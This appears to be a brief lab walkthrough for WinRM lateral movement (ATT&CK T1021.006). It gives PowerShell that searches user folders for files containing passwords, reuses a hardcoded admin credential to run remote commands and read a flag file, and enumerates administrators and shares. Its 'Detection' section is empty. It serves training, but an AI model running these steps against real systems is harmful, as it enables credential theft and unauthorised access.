## Step 1 – Find Credentials

Get-ChildItem -Recurse C:\Users -Filter "*.txt" -EA SilentlyContinue | Select-String "pass"

## Step 2 – Use Credentials for WinRM Lateral Movement
```powershell
$secpwd = ConvertTo-SecureString "Corp@Admin2024!" -AsPlainText -Force
$cred   = New-Object PSCredential("corp_admin", $secpwd)
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {
    whoami; hostname
    Get-Content "C:\Windows\System32\flag_T1021_006b.txt"
}

```

## Step 3 – Explore Access Level
```powershell
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {
    # What can corp_admin access?
    net localgroup Administrators
    net share

}
```

## Detection
